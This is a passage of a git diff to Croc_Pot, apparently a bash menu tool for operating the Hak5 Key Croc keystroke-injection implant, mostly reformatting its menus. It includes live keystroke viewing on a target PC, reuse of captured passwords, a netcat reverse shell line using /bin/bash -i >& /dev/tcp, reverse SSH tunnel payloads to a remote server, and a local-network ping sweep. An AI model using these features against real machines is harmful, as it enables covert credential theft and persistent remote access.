 	speedtest ; echo ${LINE} #; echo ${LINE} ; curl --verbose 'https://www.google.com/'
 }
 kernel_check() {
@@ -4464,7 +4357,8 @@ keystorkes_V() {
 #----Status nmon monitoring system
 ##
 nmon_system() {
-	echo -ne "$(Info_Screen '-nmon is short for Nigels performance Monitor for Linux
+	echo -ne "$(Info_Screen '
+-nmon is short for Nigels performance Monitor for Linux
 -More details at http://nmon.sourceforge.net/pmwiki.php')\n\n"
 	install_package nmon NMON_MONITORING nmon_system croc_status
 nmon
@@ -4474,7 +4368,8 @@ nmon
 ##
 list_match() {
 	clear
-	echo -ne "$(Info_Screen '-List all MATCH words in payloads folder
+	echo -ne "$(Info_Screen '
+-List all MATCH words in payloads folder
 -Option to change MATCH words')\n\n"
 if [ "$(OS_CHECK)" = WINDOWS ]; then
 	grep MATCH* /root/udisk/payloads/*.txt
@@ -4505,34 +4400,11 @@ fi
 ##
 menu_A() {
 	LED B
-MenuTitle KEYCROC STATUS MENU
-MenuColor 1 MEMORY USAGE ; echo -ne "               ${clear}\n"
-MenuColor 2 CPU LOAD ; echo -ne "                   ${clear}\n"
-MenuColor 3 NETWORK-CONNECTIONS ; echo -ne "        ${clear}\n"
-MenuColor 4 KERNEL VERSION ; echo -ne "             ${clear}\n"
-MenuColor 5 RUNNING PROCESSES ; echo -ne "          ${clear}\n"
-MenuColor 6 CHECK ALL ; echo -ne "                  ${clear}\n"
-MenuColor 7 TARGET PC INFO ; echo -ne "             ${clear}\n"
-MenuColor 8 VIEW LIVE KEYSTORKES ; echo -ne "       ${clear}\n"
-MenuColor 9 START NMON MONITORING ; echo -ne "      ${clear}\n"
-MenuColor 10 LIST MATCH PAYLOADS WORDS ; echo -ne " ${clear}\n"
-MenuColor 11 RETURN TO MAIN MENU ; echo -ne "       ${clear}\n"
-MenuEnd
+MenuTitle KEYCROC STATUS MENU ; MenuColor 27 1 MEMORY USAGE ; MenuColor 27 2 CPU LOAD ; MenuColor 27 3 NETWORK-CONNECTIONS ; MenuColor 27 4 KERNEL VERSION ; MenuColor 27 5 RUNNING PROCESSES
+MenuColor 27 6 CHECK ALL ; MenuColor 27 7 TARGET PC INFO ; MenuColor 27 8 VIEW LIVE KEYSTORKES ; MenuColor 27 9 START NMON MONITORING ; MenuColor 26 10 LIST MATCH PAYLOADS WORDS ; MenuColor 26 11 RETURN TO MAIN MENU ; MenuEnd
 	case $m_a in
-	1) memory_check ; menu_A ;;
-	2) cpu_check ; menu_A ;;
-	3) tcp_check ; menu_A ;;
-	4) kernel_check ; menu_A ;;
-	5) processes_check ; menu_A ;;
-	6) all_checks ; menu_A ;;
-	7) pc_info ; menu_A ;;
-	8) keystorkes_V ; menu_A ;;
-	9) nmon_system ; menu_A ;;
-	10) list_match ; menu_A ;;
-	11) main_menu ;;
-	0) exit 0 ;;
-	[bB]) main_menu ;;
-	*) invalid_entry ; menu_A ;;
+	1) memory_check ; menu_A ;; 2) cpu_check ; menu_A ;; 3) tcp_check ; menu_A ;; 4) kernel_check ; menu_A ;; 5) processes_check ; menu_A ;; 6) all_checks ; menu_A ;;
+	7) pc_info ; menu_A ;; 8) keystorkes_V ; menu_A ;; 9) nmon_system ; menu_A ;; 10) list_match ; menu_A ;; 11) main_menu ;; 0) exit 0 ;; [bB]) main_menu ;; *) invalid_entry ; menu_A ;;
 	esac
  }
 menu_A
@@ -4591,7 +4463,8 @@ fi
 ##
 midnight_manager() {
 	clear
-	echo -ne "$(Info_Screen '-GNU Midnight Commander is a visual file manager
+	echo -ne "$(Info_Screen '
+-GNU Midnight Commander is a visual file manager
 -More details at https://midnight-commander.org')\n"
 ##
 #----midnight install function
@@ -4618,20 +4491,9 @@ mc_remove() {
 ##
 #----midnight Menu
 ##
-MenuTitle MIDNIGHT COMMANDER MENU
-MenuColor 1 INSTALL MIDNIGHT COMMANDER ; echo -ne " ${clear}\n"
-MenuColor 2 REMOVE MIDNIGHT COMMANDER ; echo -ne "  ${clear}\n"
-MenuColor 3 START MIDNIGHT COMMANDER ; echo -ne "   ${clear}\n"
-MenuColor 4 RETURN TO MAIN MENU ; echo -ne "        ${clear}\n"
-MenuEnd
+MenuTitle MIDNIGHT COMMANDER MENU ; MenuColor 26 1 INSTALL MIDNIGHT COMMANDER ; MenuColor 26 2 REMOVE MIDNIGHT COMMANDER ; MenuColor 26 3 START MIDNIGHT COMMANDER ; MenuColor 26 4 RETURN TO MAIN MENU ; MenuEnd
 	case $m_a in
-	1) mc_install ; midnight_manager ;;
-	2) mc_remove ; midnight_manager ;;
-	3) mc ; midnight_manager ;;
-	4) main_menu ;;
-	0) exit 0 ;;
-	[bB]) croc_edit_menu ;;
-	*) invalid_entry ; midnight_manager ;;
+	1) mc_install ; midnight_manager ;; 2) mc_remove ; midnight_manager ;; 3) mc ; midnight_manager ;; 4) main_menu ;; 0) exit 0 ;; [bB]) croc_edit_menu ;; *) invalid_entry ; midnight_manager ;;
 	esac
 }
 ##
@@ -4639,7 +4501,8 @@ MenuEnd
 ##
 insert_quack() {
 	clear
-	echo -ne "$(Info_Screen '-This will open Target pc terminal
+	echo -ne "$(Info_Screen '
+-This will open Target pc terminal
 -Insert Quack command
 -Example enter echo "hello world"
 -hello world should display in terminal and exit')\n\n"
@@ -4715,36 +4578,11 @@ esac
 #----Croc Edit Menu
 ##
 	LED B
-MenuTitle CROC EDIT MENU
-MenuColor 1 CROC PAYLOADS FOLDER ; echo -ne "   ${clear}\n"
-MenuColor 2 CROC TOOLS FOLDER ; echo -ne "      ${clear}\n"
-MenuColor 3 CROC LOOT FOLDER ; echo -ne "       ${clear}\n"
-MenuColor 4 CROC CONFIG FILE ; echo -ne "       ${clear}\n"
-MenuColor 5 CROC ENTER FILE NAME ; echo -ne "   ${clear}\n"
-MenuColor 6 CROC REMOVE FILES ; echo -ne "      ${clear}\n"
-MenuColor 7 ATTACKMODE HID STORAGE ; echo -ne " ${clear}\n"
-MenuColor 8 ATTACKMODE HID ; echo -ne "         ${clear}\n"
-MenuColor 9 RELOAD_PAYLOADS ; echo -ne "        ${clear}\n"
-MenuColor 10 MIDNIGHT MANAGER ; echo -ne "      ${clear}\n"
-MenuColor 11 QUACK COMMAND ; echo -ne "         ${clear}\n"
-MenuColor 12 RETURN TO MAIN MENU ; echo -ne "   ${clear}\n"
-MenuEnd
+MenuTitle CROC EDIT MENU ; MenuColor 22 1 CROC PAYLOADS FOLDER ; MenuColor 22 2 CROC TOOLS FOLDER ; MenuColor 22 3 CROC LOOT FOLDER ; MenuColor 22 4 CROC CONFIG FILE ; MenuColor 22 5 CROC ENTER FILE NAME ; MenuColor 22 6 CROC REMOVE FILES
+MenuColor 22 7 ATTACKMODE HID STORAGE ; MenuColor 22 8 ATTACKMODE HID ; MenuColor 22 9 RELOAD_PAYLOADS ; MenuColor 21 10 MIDNIGHT MANAGER ; MenuColor 21 11 QUACK COMMAND ; MenuColor 21 12 RETURN TO MAIN MENU ; MenuEnd
 	case $m_a in
-	1) edit_all /root/udisk/payloads ; croc_edit_menu ;;
-	2) edit_all /root/udisk/tools ; croc_edit_menu ;;
-	3) edit_all /root/udisk/loot ; croc_edit_menu ;;
-	4) edit_config ; croc_edit_menu ;;
-	5) edit_all ; croc_edit_menu ;;
-	6) remove_file ; croc_edit_menu ;;
-	7) ATTACKMODE HID STORAGE ; croc_edit_menu ;;
-	8) ATTACKMODE HID ; croc_edit_menu ;;
-	9) RELOAD_PAYLOADS ; croc_edit_menu ;;
-	10) midnight_manager ; croc_edit_menu ;;
-	11) insert_quack ; croc_edit_menu ;;
-	12) main_menu ;;
-	0) exit 0 ;;
-	[bB]) main_menu ;;
-	*) invalid_entry ; croc_edit_menu ;;
+	1) edit_all /root/udisk/payloads ; croc_edit_menu ;; 2) edit_all /root/udisk/tools ; croc_edit_menu ;; 3) edit_all /root/udisk/loot ; croc_edit_menu ;; 4) edit_config ; croc_edit_menu ;; 5) edit_all ; croc_edit_menu ;; 6) remove_file ; croc_edit_menu ;;
+	7) ATTACKMODE HID STORAGE ; croc_edit_menu ;; 8) ATTACKMODE HID ; croc_edit_menu ;; 9) RELOAD_PAYLOADS ; croc_edit_menu ;; 10) midnight_manager ; croc_edit_menu ;; 11) insert_quack ; croc_edit_menu ;; 12) main_menu ;; 0) exit 0 ;; [bB]) main_menu ;; *) invalid_entry ; croc_edit_menu ;;
 	esac
 }
 ##
@@ -4761,9 +4599,9 @@ function ssh_menu() {
 # Validate IP v4 or v6 address and start ssh to hak5 device
 #
 ip_check_ssh() {
-ping -c1 -w1 ${1} &>/dev/null 2>&1
+ping -q -c 1 -w 1 ${1} &>/dev/null 2>&1
 if [[ $? -ne 0 ]]; then
-	ping -c1 -w1 ${2} &>/dev/null 2>&1
+	ping -q -c 1 -w 1 ${2} &>/dev/null 2>&1
 	if [[ $? -ne 0 ]]; then
 		echo -ne "\e[5m$(ColorRed 'Can not start SSH connect on:')${2}${clear}"
 	elif [[ "${#args[@]}" -eq 0 ]]; then
@@ -4779,16 +4617,16 @@ fi
 #----SSH check devices for connection
 ##
 check_device() {
-ping -c 1 -w 1 ${1} &>/dev/null 2>&1
+ping -q -c 1 -w 1 ${1} &>/dev/null 2>&1
 if [[ $? -ne 0 ]]; then
-	ping -c 1 -w 1 ${DEFAULT_IP} &>/dev/null 2>&1
+	ping -q -c 1 -w 1 ${DEFAULT_IP} &>/dev/null 2>&1
 	if [[ $? -ne 0 ]]; then
 		sleep 0.1
 	elif [[ "${#args[@]}" -eq 0 ]]; then
-		echo -ne "${yellow}${@:2}${clear}${green}ONLINE${clear}${yellow} IP:${clear}${green}$(ping -c 1 -w 1 ${DEFAULT_IP} | sed -nE 's/^PING[^(]+\(([^)]+)\).*/\1/p')${clear}" ; get_mac ${1} ; port_check ${1}
+		echo -ne "${yellow}${@:2}${clear}${green}ONLINE${clear}${yellow} IP:${clear}${green}$(ping -q -c 1 -w 1 ${DEFAULT_IP} | sed -nE 's/^PING[^(]+\(([^)]+)\).*/\1/p')${clear}" ; get_mac ${1} ; port_check ${1}
 	fi
 elif [[ "${#args[@]}" -eq 0 ]]; then
-	echo -ne "${yellow}${@:2}${clear}${green}ONLINE${clear}${yellow} IP:${clear}${green}$(ping -c 1 -w 1 ${1} | sed -nE 's/^PING[^(]+\(([^)]+)\).*/\1/p')${clear}" ; get_mac ${1} ; port_check ${1}
+		echo -ne "${yellow}${@:2}${clear}${green}ONLINE${clear}${yellow} IP:${clear}${green}$(ping -q -c 1 -w 1 ${1} | sed -nE 's/^PING[^(]+\(([^)]+)\).*/\1/p')${clear}" ; get_mac ${1} ; port_check ${1}
 fi 2> /dev/null
 }
 ##
@@ -4826,7 +4664,7 @@ if [[ $? -ne 0 ]]; then
 		unset DEFAULT_IP
 	fi
 elif [[ "${#args[@]}" -eq 0 ]]; then
-	echo -ne "${yellow}Port:${clear}${green}22 open${clear}\n"
+		echo -ne "${yellow}Port:${clear}${green}22 open${clear}\n"
 fi 2> /dev/null
 }
 ##
@@ -4842,7 +4680,7 @@ if [[ $? -ne 0 ]]; then
 		sleep 0.1
 	fi
 elif [[ "${#args[@]}" -eq 0 ]]; then
-	echo -ne "${yellow} MAC:${clear}${green}$(arp ${1} | awk '{print $3}' | sed -e 's/HWaddress//g' | sed '/^[[:space:]]*$/d')"
+		echo -ne "${yellow} MAC:${clear}${green}$(arp ${1} | awk '{print $3}' | sed -e 's/HWaddress//g' | sed '/^[[:space:]]*$/d')"
 fi 2> /dev/null
 }
 ##
@@ -4887,13 +4725,16 @@ ssid_check() {
 ##
 #----SSH display info screen
 ##
-	echo -ne "$(Info_Screen '-SSH into HAK5 gear & TARGET PC
+	echo -ne "$(Info_Screen '
+-SSH into HAK5 gear & TARGET PC
 -Reverse ssh tunnel, Create SSH Public/Private Key
 -Ensure devices are connected to the same local network As keycroc')\n"
 local croc_mac=$(cat /sys/class/net/$(ip route show default | awk '/default/ {print $5}')/address)
+local croc_city=$(curl -s --connect-timeout 2 --max-time 2 ipinfo.io | sed -n 's/\("city"\)/\1/p' | sed 's/"city"://g' | sed 's/"//g' | sed 's/,//g' | sed 's/^[[:space:]]*//' ; echo $1)
+local croc_country=$(curl -s --connect-timeout 2 --max-time 2 ipinfo.io | sed -n 's/\("country":\)/\1/p' | sed 's/"country"://g' | sed 's/"//g' | sed 's/,//g' | sed 's/^[[:space:]]*//' ; echo $1)
 check_device $(os_ip) TARGET PC:
 ssid_check
-echo -ne "${yellow}Public ip:${clear}${green}$(curl -s --connect-timeout 2 --max-time 2 https://checkip.amazonaws.com)${clear}\n" ; check_device ${remote_vps} REMOTE VPS: | sed 's/MAC://g' | sed 's/--//g'
+echo -ne "${yellow}Public ip:${clear}${green}$(curl -s --connect-timeout 2 --max-time 2 https://checkip.amazonaws.com) ${clear}${yellow}COUNTRY:${clear}${green}${croc_country} ${clear}${yellow}CITY:${clear}${green}${croc_city}${clear}\n" ; check_device ${remote_vps} REMOTE VPS: | sed 's/MAC://g' | sed 's/--//g'
 check_device croc KEY CROC: | sed 's/--/'$croc_mac'/g'
 default_ip 172.16.42.1 ; check_device mk7 WIFI PINEAPPLE:
 saved_mac /root/udisk/tools/Croc_Pot/squirrel_mac.txt 1p ; default_ip 172.16.32.1 ; check_device squirrel PACKET SQUIRREL:
@@ -4933,6 +4774,13 @@ else
 fi
 }
 ##
+#----SSH Reachable target on local network
+##
+reachable_target() {
+	local t_ip=$(route -n | grep "UG" | grep -v "UGH" | cut -f 10 -d " " | sed -r 's/.{1}$//')
+	for i in {1..254} ;do (ping -q -c 1 -w 1 $t_ip$i >/dev/null && echo "$t_ip$i" &) ;done | ip n | grep -i reach | sed -r 's/\b(dev|lladdr)\b//g'
+}
+##
 #----SSH enter user/ip to start ssh
 ##
 userinput_ssh() {
@@ -4945,18 +4793,9 @@ userinput_ssh() {
 ##
 ssh_pineapple() {
 	clear
-MenuTitle WIFI PINEAPPLE MENU
-MenuColor 1 SSH PINEAPPLE ; echo -ne "       ${clear}\n"
-MenuColor 2 PINEAPPLE WEB ; echo -ne "       ${clear}\n"
-MenuColor 3 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
-MenuEnd
+MenuTitle WIFI PINEAPPLE MENU ; MenuColor 19 1 SSH PINEAPPLE ; MenuColor 19 2 PINEAPPLE WEB ; MenuColor 19 3 RETURN TO MAIN MENU ; MenuEnd
 	case $m_a in
-	1) ip_check_ssh mk7 172.16.42.1 ; ssh_menu ;;
-	2) start_web http://172.16.42.1:1471 ; ssh_menu ;;
-	3) main_menu ;;
-	0) exit 0 ;;
-	[bB]) ssh_menu ;;
-	*) invalid_entry ; ssh_pineapple ;;
+	1) ip_check_ssh mk7 172.16.42.1 ; ssh_menu ;; 2) start_web http://172.16.42.1:1471 ; ssh_menu ;; 3) main_menu ;; 0) exit 0 ;; [bB]) ssh_menu ;; *) invalid_entry ; ssh_pineapple ;;
 	esac
 }
 ##
@@ -4977,7 +4816,7 @@ ssh_turtle() {
 ssh_shark() {
 	local SHARK_IP=/root/udisk/tools/Croc_Pot/shark_ip.txt
 if [ -e ${SHARK_IP} ]; then
-	if [[ "$(sed -n '1p' ${SHARK_IP})" =~ ^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))|((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))))$ ]]; then
+	if [[ "$(sed -n '1p' ${SHARK_IP})" =~ ${validate_ip} ]]; then
 		ip_check_ssh $(sed -n '1p' ${SHARK_IP}) shark
 else
 		ip_check_ssh shark 172.16.24.1
@@ -4989,7 +4828,8 @@ fi 2> /dev/null
 ##
 ssh_bunny() {
 	clear
-	echo -ne "$(Info_Screen '-Start ssh with Target PC to Bash bunny or
+	echo -ne "$(Info_Screen '
+-Start ssh with Target PC to Bash bunny or
 -Start REVERSE SHELL Tunnel with keycroc to bash bunny
 -Will need a small payload install on bash bunny
 -This will create the payload for the bash bunny and save it to tools folder
@@ -5101,7 +4941,8 @@ esac
 ##
 ssh_keygen() {
 	clear
-	echo -ne "$(Info_Screen '-Create public/private keys using ssh-key-gen on local-host
+	echo -ne "$(Info_Screen '
+-Create public/private keys using ssh-key-gen on local-host
 -Generate keys on the keycroc and send to remote-host
 -This will run ssh-keygen and copy to remote-host
 -ssh-copy-id -i ~/.ssh/id_rsa.pub username@remote-host-ip
@@ -5131,7 +4972,8 @@ esac
 ##
 croc_reverse_shell() {
 	clear
-	echo -ne "$(Info_Screen '# 1 Start reverse shell with nc start listening on remote-server first
+	echo -ne "$(Info_Screen '
+# 1 Start reverse shell with nc start listening on remote-server first
 # 2 Start listening on the keycroc
 # 3 Create payload to start reverse shell KeyCroc to remote-server
 # 4 Start reverse ssh tunnel target pc to KeyCroc
@@ -5149,13 +4991,14 @@ shell_input() {
 ##
 remote_listener() {
 	clear
-	echo -ne "$(Info_Screen '-Start a reverse shell with netcat on keycroc
+	echo -ne "$(Info_Screen '
+-Start a reverse shell with netcat on keycroc
 -Remotely access keycroc from a remote-server
 -Frist On the listening remote-server enter this below
--\e[40;32mnc -lnvp PORT# -s IP OF LISTENING REMOTE-SERVER\e[0m\e[40;93m
+-->nc -lnvp PORT# -s IP OF LISTENING REMOTE-SERVER
 -On Keycroc Enter ip of the listening remote-server and port number
 -Keycroc side will be setup as below
--\e[40;32m/bin/bash -i >& /dev/tcp/remote-server-ip/port#')${clear}\n\n"
+-->/bin/bash -i >& /dev/tcp/remote-server-ip/port#')\n"
 read_all START REVERSE SHELL Y/N AND PRESS [ENTER]
 case $r_a in
 	[yY] | [yY][eE][sS])
@@ -5191,7 +5034,8 @@ esac
 ##
 croc_listener() {
 	clear
-	echo -ne "$(Info_Screen '-Start Listening on keycroc
+	echo -ne "$(Info_Screen '
+-Start Listening on keycroc
 -Access on remote PC,server
 -This will start listening on the keycroc
 -Enter this below on remote-server/host side
@@ -5213,12 +5057,13 @@ esac
 ##
 reverse_payload() {
 	clear
-	echo -ne "$(Info_Screen '-Create Reverse SSH Tunnel Payload keycroc to remote-server
+	echo -ne "$(Info_Screen '
+-Create Reverse SSH Tunnel Payload keycroc to remote-server
 -Plug keycroc into Target pc and type in croctunnel
 -Keycroc side will be setup as below
--\e[40;32mssh -fN -R port#:localhost:22 username@your-server-ip\e[0m\e[40;93m
+-->ssh -fN -R port#:localhost:22 username@your-server-ip
 -Enter on remote-server side as below
--\e[40;32mssh root@localhost -p port#')${clear}\n\n"
+-->ssh root@localhost -p port#')\n"
 local PAYLOAD_SHELL=/root/udisk/payloads/Croc_Shell.txt
 if [ -e "${PAYLOAD_SHELL}" ]; then
 	echo -ne "\n$(ColorGreen 'Croc_Shell already exists')\n"
@@ -5253,11 +5098,12 @@ fi
 ##
 shell_pc() {
 	clear
-	echo -ne "$(Info_Screen '-Start reverse ssh tunnel Target PC to Keycroc
+	echo -ne "$(Info_Screen '
+-Start reverse ssh tunnel Target PC to Keycroc
 -PC side will be setup with this below
--\e[40;32mssh -fN -R port#:localhost:22 root@keycroc IP\e[0m\e[40;93m
+-->ssh -fN -R port#:localhost:22 root@keycroc IP
 -Keycroc side will be setup with this below
--\e[40;32mssh PC-username@localhost -p port#\e[0m')\n\n"
+-->ssh PC-username@localhost -p port#')\n"
 	echo -ne "$(ColorYellow 'Found save Passwd try this:') $(target_pw)\n"
 start_shell() {
 if [ -e "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
@@ -5358,7 +5204,8 @@ fi
 ##
 ssh_tunnel() {
 	clear
-	echo -ne "$(Info_Screen '-Start a Reverse SSH Tunnel Keycroc to remote-server
+	echo -ne "$(Info_Screen '
+-Start a Reverse SSH Tunnel Keycroc to remote-server
 -Remotely access keycroc from a remote-server VPS
 -Keycroc will be setup with these setting below
 -\e[40;32mssh -fN -R port#:localhost:22 root@remote-server-ip\e[0m\e[40;93m
@@ -5402,7 +5249,8 @@ esac
 ##
 remote_command() {
 	clear
-	echo -ne "$(Info_Screen '-Execute a remote command on a host over SSH
+	echo -ne "$(Info_Screen '
+-Execute a remote command on a host over SSH
 -Example ssh root@192.168.1.1 uptime
 -ssh USER@HOST COMMAND1; COMMAND2; COMMAND3 or
 -ssh USER@HOST COMMAND1 | COMMAND2 | COMMAND3
@@ -5430,28 +5278,11 @@ else
 fi
 }
 command_menu() {
-MenuTitle REMOTE COMMAND MENU
-MenuColor 1 COMMAND TO TARGET PC ; echo -ne "    ${clear}\n"
-MenuColor 2 USERNAME/IP AND COMMAND ; echo -ne " ${clear}\n"
-MenuColor 3 COMMAND TO PINEAPPLE ; echo -ne "    ${clear}\n"
-MenuColor 4 COMMAND TO SQUIRREL ; echo -ne "     ${clear}\n"
-MenuColor 5 COMMAND TO TURTLE ; echo -ne "       ${clear}\n"
-MenuColor 6 COMMAND TO SHARK ; echo -ne "        ${clear}\n"
-MenuColor 7 COMMAND TO BUNNY ; echo -ne "        ${clear}\n"
-MenuColor 8 RETURN TO MAIN MENU ; echo -ne "     ${clear}\n"
-MenuEnd
+MenuTitle REMOTE COMMAND MENU ; MenuColor 24 1 COMMAND TO TARGET PC ; MenuColor 24 2 USERNAME/IP AND COMMAND ; MenuColor 24 3 COMMAND TO PINEAPPLE ; MenuColor 24 4 COMMAND TO SQUIRREL
+MenuColor 24 5 COMMAND TO TURTLE ; MenuColor 24 6 COMMAND TO SHARK ; MenuColor 24 7 COMMAND TO BUNNY ; MenuColor 24 8 RETURN TO MAIN MENU ; MenuEnd
 	case $m_a in
-	1) pc_target_command ; command_menu ;;
-	2) input_command ; command_menu ;;
-	3) target_command root 172.16.42.1 ; command_menu ;;
-	4) target_command root 172.16.32.1 ; command_menu ;;
-	5) target_command root 172.16.84.1 ; command_menu ;;
-	6) target_command root ${IP_F} ; command_menu ;;
-	7) target_command root localhost -p 7000 ; command_menu ;;
-	8) main_menu ;;
-	0) exit 0 ;;
-	[bB]) croc_reverse_shell ;;
-	*) invalid_entry ; remote_command ;;
+	1) pc_target_command ; command_menu ;; 2) input_command ; command_menu ;; 3) target_command root mk7 ; command_menu ;; 4) target_command root 172.16.32.1 ; command_menu ;; 5) target_command root 172.16.84.1 ; command_menu ;;
+	6) shark_check ; target_command root ${DEFAULT_IP} ; command_menu ;; 7) target_command root localhost -p 7000 ; command_menu ;; 8) main_menu ;; 0) exit 0 ;; [bB]) croc_reverse_shell ;; *) invalid_entry ; remote_command ;;
 	esac
 }
 command_menu
@@ -5459,26 +5290,9 @@ command_menu
 ##
 #----SSH croc reverse shell Menu
 ##
-MenuTitle REVERSE SSH TUNNEL MENU
-MenuColor 1 REVERSE TUNNEL NETCAT ; echo -ne "    ${clear}\n"
-MenuColor 2 CROC LISTENING ; echo -ne "           ${clear}\n"
-MenuColor 3 REVERSE TUNNEL PAYLOAD ; echo -ne "   ${clear}\n"
-MenuColor 4 REVERSE TUNNEL TARGET PC ; echo -ne " ${clear}\n"
-MenuColor 5 REVERSE TUNNEL VPS ; echo -ne "       ${clear}\n"
-MenuColor 6 REMOTE COMMANDS TARGETS ; echo -ne "  ${clear}\n"
-MenuColor 7 RETURN TO MAIN MENU ; echo -ne "      ${clear}\n"
-MenuEnd
+MenuTitle REVERSE SSH TUNNEL MENU ; MenuColor 24 1 REVERSE TUNNEL NETCAT ; MenuColor 24 2 CROC LISTENING ; MenuColor 24 3 REVERSE TUNNEL PAYLOAD ; MenuColor 24 4 REVERSE TUNNEL TARGET PC ; MenuColor 24 5 REVERSE TUNNEL VPS ; MenuColor 24 6 REMOTE COMMANDS TARGETS ; MenuColor 24 7 RETURN TO MAIN MENU ; MenuEnd
 	case $m_a in
-	1) remote_listener ; croc_reverse_shell ;;
-	2) croc_listener ; croc_reverse_shell ;;
-	3) reverse_payload ; croc_reverse_shell ;;
-	4) shell_pc ; croc_reverse_shell ;;
-	5) ssh_tunnel ; croc_reverse_shell ;;
-	6) remote_command ;;
-	7) main_menu ;;
-	0) exit 0 ;;
-	[bB]) ssh_menu ;;
-	*) invalid_entry ; croc_reverse_shell ;;
+	1) remote_listener ; croc_reverse_shell ;; 2) croc_listener ; croc_reverse_shell ;; 3) reverse_payload ; croc_reverse_shell ;; 4) shell_pc ; croc_reverse_shell ;; 5) ssh_tunnel ; croc_reverse_shell ;; 6) remote_command ;; 7) main_menu ;; 0) exit 0 ;; [bB]) ssh_menu ;; *) invalid_entry ; croc_reverse_shell ;;
 	esac
 }
 ##
@@ -5486,7 +5300,8 @@ MenuEnd
 ##
 remove_sshkey() {
 	clear
-	echo -ne "$(Info_Screen '-Add correct host key in /root/.ssh/known_hosts to get rid of this message
+	echo -ne "$(Info_Screen '
+-Add correct host key in /root/.ssh/known_hosts to get rid of this message
 -remove with: ssh-keygen -f "/root/.ssh/known_hosts" -R IP
 -Just add the IP to remove ssh-keygen')\n\n"
 read_all REMOVE SSH_KEYGEN FOR PACIFIC IP Y/N AND PRESS [ENTER]
@@ -5504,32 +5319,12 @@ esac
 #----SSH Menu
 ## 
 	LED B
-echo -ne "\n" ; MenuTitle CROC POT SSH MENU | tr '\n' '\t' ; echo -ne "\n"
-echo -ne "\t\t" ; MenuColor 1 SSH TARGET PC | tr -d '\t' ; echo -ne "   ${clear}" ; MenuColor 7 LAN TURTLE | tr -d '\t' ; echo -ne "          ${clear}\n"
-echo -ne "\t\t" ; MenuColor 2 SSH USER INPUT | tr -d '\t' ; echo -ne "  ${clear}" ; MenuColor 8 SHARK JACK | tr -d '\t' ; echo -ne "          ${clear}\n"
-echo -ne "\t\t" ; MenuColor 3 ENABLE_SSH | tr -d '\t' ; echo -ne "      ${clear}" ; MenuColor 9 BASH BUNNY | tr -d '\t' ; echo -ne "          ${clear}\n"
-echo -ne "\t\t" ; MenuColor 4 DISABLE_SSH | tr -d '\t' ; echo -ne "     ${clear}" ; MenuColor 10 REVERSE SHELL | tr -d '\t' ; echo -ne "      ${clear}\n"
-echo -ne "\t\t" ; MenuColor 5 WIFI PINEAPPLE | tr -d '\t' ; echo -ne "  ${clear}" ; MenuColor 11 PUBLIC/PRIVATE KEY | tr -d '\t' ; echo -ne " ${clear}\n"
-echo -ne "\t\t" ; MenuColor 6 PACKET SQUIRREL | tr -d '\t' ; echo -ne " ${clear}" ; MenuColor 12 REMOVE SSH_KEYGEN | tr -d '\t' ; echo -ne "  ${clear}\n"
-MenuColor 13 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
+MenuTitle CROC POT SSH MENU ; echo -ne "\t\t" ; MenuColor 18 1 SSH TARGET PC | tr -d '\t\n' ; MenuColor 19 7 LAN TURTLE | tr -d '\t' ; echo -ne "\t\t" ; MenuColor 18 2 SSH USER INPUT | tr -d '\t\n' ; MenuColor 19 8 SHARK JACK | tr -d '\t' ; echo -ne "\t\t" ; MenuColor 18 3 ENABLE_SSH | tr -d '\t\n' ; MenuColor 19 9 BASH BUNNY | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 18 4 DISABLE_SSH | tr -d '\t\n' ; MenuColor 18 10 REVERSE SHELL | tr -d '\t' ; echo -ne "\t\t" ; MenuColor 18 5 WIFI PINEAPPLE | tr -d '\t\n' ; MenuColor 18 11 PUBLIC/PRIVATE KEY | tr -d '\t' ; echo -ne "\t\t" ; MenuColor 18 6 PACKET SQUIRREL | tr -d '\t\n' ; MenuColor 18 12 REMOVE SSH_KEYGEN | tr -d '\t' ; MenuColor 18 13 RETURN TO MAIN MENU
 MenuEnd
 	case $m_a in
-	1) pc_ssh ; ssh_menu ;;
-	2) userinput_ssh ; ssh_menu ;;
-	3) ENABLE_SSH ; ssh_menu ;;
-	4) DISABLE_SSH ; ssh_menu ;;
-	5) ssh_pineapple ; ssh_menu ;;
-	6) ssh_squirrel ; ssh_menu ;;
